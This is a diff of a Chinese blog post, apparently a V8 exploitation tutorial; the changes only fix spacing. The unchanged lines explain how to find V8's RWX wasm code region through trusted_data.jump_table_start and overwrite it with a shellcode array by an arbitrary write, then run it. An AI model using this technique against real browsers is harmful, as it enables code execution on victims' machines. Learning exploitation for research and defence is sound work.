@@ -195,7 +195,7 @@ var wasmInstance = new WebAssembly.Instance(wasmModule, {});
 var f = wasmInstance.exports.main;
 ```
 
-可以通过查看 wasmInstance 的 trusted_data 字段、 trusted_data 的 jump_table_start 字段得到可读可写可执行段的地址，然后通过任意地址写来覆盖 wasm 为 shellcode 。
+可以通过查看 wasmInstance 的 trusted_data 字段、 trusted_data 的 jump_table_start 字段得到可读可写可执行段的地址，然后通过任意地址写来覆盖 wasm 为 shellcode。
 ```js
 let sc = [5188146770760222536n, 10180386957671122887n, 14035265928560645429n, 14359732973853474822n, 18388557918367661248n, 2409263538477991183n, 10416984888683040768n]
 
@@ -217,8 +217,8 @@ for (let i = 0; i < sc.length; i++) {
 f();
 ```
 
-最后再调用 f ，也就是 wasm 代码，就能运行刚才写的 shellcode 了。
+最后再调用 f，也就是 wasm 代码，就能运行刚才写的 shellcode 了。
 
 ## 特别鸣谢
 感谢 NepNep 战队的 [sysNow](https://sysnow.xyz/) 师傅。
-在写完 php 那篇文章后，sysNow 师傅正好给我发了一篇 V8 的文章，我刚好也趁着这个机会学习一下 V8 ，遇到不明白的也感谢 sysNow 师傅给我解答。
+在写完 php 那篇文章后，sysNow 师傅正好给我发了一篇 V8 的文章，我刚好也趁着这个机会学习一下 V8，遇到不明白的也感谢 sysNow 师傅给我解答。
